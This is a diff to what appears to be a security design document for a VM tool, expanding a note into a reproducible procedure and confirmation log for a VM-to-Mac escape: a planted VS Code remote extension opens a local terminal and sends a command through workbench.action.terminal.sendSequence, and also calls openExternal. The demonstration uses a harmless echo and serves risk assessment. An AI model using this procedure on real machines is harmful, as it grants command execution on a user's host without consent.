@@ -203,7 +203,42 @@ vm-up and `den doctor` read what VM commands print. That is safe only if they tr
 
 **What we accept:** while a VS Code window is open on a VM folder, the VM can run a command as you on the Mac. Closing the window closes the path.
 
-**Proven live on 2026-11-20**, VS Code 1.147.0: a throwaway extension in `~/.vscode-server/extensions` called `workbench.action.terminal.newLocal`, then `workbench.action.terminal.sendSequence` with `echo 'vm jailbreak'`. The Mac opened a local terminal and ran it (`This shell is running on your local machine, not on the connected remote`). The same extension also reached the Mac with `env.openExternal`. The extension is removed. So this is not a theory, and this version has no block.
+**Proven live on 2026-11-20, VS Code 1.147.0.** The procedure and the confirmation are below. This version has no block.
+
+### The procedure (2026-11-20)
+
+Run as the VM user. No Mac access is needed at any step.
+
+1. **Confirm a window is connected.** `ps -eo args | grep [e]xtensionHostProcess` shows a process, and `$XDG_RUNTIME_DIR/vscode-ipc-*.sock` exists. That socket is the channel to the Mac window.
+2. **Drop in an extension.** Create `~/.vscode-server/extensions/den-jailbreak-demo-0.0.1/` with `package.json` (`engines.vscode: ^1.90.0`, `extensionKind: ["workspace"]`, `activationEvents: ["onStartupFinished"]`, `main: ./extension.js`) and `extension.js` that appends a timestamped line to a log, then calls:
+   - `vscode.commands.executeCommand('workbench.action.terminal.newLocal')`
+   - `vscode.commands.executeCommand('workbench.action.terminal.sendSequence', { text: "echo 'vm jailbreak'\n" })`
+   - `vscode.env.openExternal(vscode.Uri.parse('vscode://den-demo.jailbreak/x'))`
+3. **Register it.** Add it to `~/.vscode-server/extensions/extensions.json`. The server reads that file, not the folder name.
+4. **Open the window on a VM folder.** The VS Code window on the Mac reloads the remote extension host and activates the extension.
+
+### The confirmation
+
+The VM wrote this log:
+
+```
+2026-11-20T15:24:18.329Z activate start
+2026-11-20T15:24:18.572Z newLocal: ok
+2026-11-20T15:24:19.219Z sendSequence: ok
+2026-11-20T15:24:20.286Z openExternal ok vscode://den-demo.jailbreak/x
+```
+
+The Mac showed a terminal that nobody typed into:
+
+```
+This shell is running on your local machine, not on the connected remote
+$ echo 'vm jailbreak'
+vm jailbreak
+```
+
+The extension was removed after the test, and `extensions.json` is empty again. To repeat it, do the four steps above; it takes about two minutes.
+
+**What this proves:** anything that can write to `~/.vscode-server/extensions` in the VM owns a shell on the Mac while that window is open. Two of the four D1 rows are confirmed (`executeCommand` of a client command, and `openExternal`). The clipboard and `workspace.fs` rows are not tested.
 
 **How it works:**
 
